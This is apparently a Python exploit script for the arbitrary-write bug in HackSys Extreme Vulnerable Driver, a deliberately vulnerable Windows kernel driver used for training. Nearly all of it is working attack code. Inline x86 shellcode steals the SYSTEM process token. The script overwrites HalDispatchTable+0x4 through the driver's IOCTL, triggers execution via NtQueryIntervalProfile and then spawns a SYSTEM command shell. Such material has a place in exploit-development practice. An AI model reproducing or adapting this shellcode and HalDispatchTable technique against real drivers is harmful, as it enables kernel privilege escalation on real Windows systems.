import os
from helper import *
from ctypes import *

def ioctl(function, devicetype = 0x00000022, access = 0x00000000, method = 0x00000003):
	return ((devicetype << 16) | (access << 14) | (function << 2) | method)

def main():
	HEVD_IOCTL_ARBITRARY_WRITE = ioctl(0x802)
	lpFileName = "\\\\.\\HackSysExtremeVulnerableDriver"
	handle = get_handle(lpFileName)

	steal_token = (
		"\x60"                              # pushad
		"\x33\xc0"                          # xor   eax,eax
		"\x64\x8b\x80\x24\x01\x00\x00"      # mov   eax,DWORD PTR fs:[eax+0x124]
		"\x8b\x40\x50"                      # mov   eax,DWORD PTR [eax+0x50]
		"\x8b\xc8"                          # mov   ecx,eax
		"\x8b\x80\xb8\x00\x00\x00"          # mov   eax,DWORD PTR [eax+0xb8]
		"\x2d\xb8\x00\x00\x00"              # sub   eax,0xb8
		"\x83\xb8\xb4\x00\x00\x00\x04"      # cmp   DWORD PTR [eax+0xb4],0x4
		"\x75\xec"                          # jne   0xe
		"\x8b\x90\xf8\x00\x00\x00"          # mov   edx,DWORD PTR [eax+0xf8]
		"\x89\x91\xf8\x00\x00\x00"          # mov   DWORD PTR [ecx+0xf8],edx
		"\x61"                              # popad
		"\xc3"                              # retn
	)

	write_what = p32(0x40400008)                    # shellcode pointer
	write_where = p32(get_haldispatchtable() + 0x4) # calculate HalDispatchTable+0x4

	# Overwrite 'HalDispatchTable+0x4' -> ptr(0x40400008) -> 0x42424242 (shellcode)
	payload_input = write_what        # shellcode ptr: 0x40400008  ----+
	payload_input += write_where      # addr: HalDispatchTable+0x4     |
	payload_input += p32(0x42424242)  # shellcode position         <---+
	alloc_memory(0x40400000, payload_input, len(payload_input))

	# Allocate 'shellcode' at 0x42424242
	shellcode = "\x90" * 0x08
	shellcode += steal_token
	shellcode += "\x90" * (0x80 - 0x08 - len(steal_token))
	alloc_memory(0x42424242, shellcode, len(shellcode))

	# Trigger the bug via DeviceIoControl() at 0x40400000
	device = trigger(handle, HEVD_IOCTL_ARBITRARY_WRITE, 0x40400000, len(payload_input))

	# Calling the NtQueryIntervalProfile function, executing our shellcode
	ntdll.NtQueryIntervalProfile(0x1337, byref(c_ulong()))
	print("[+] Spawn SYSTEM shell\n")
	os.system("cmd.exe")

if __name__ == "__main__":
	main()
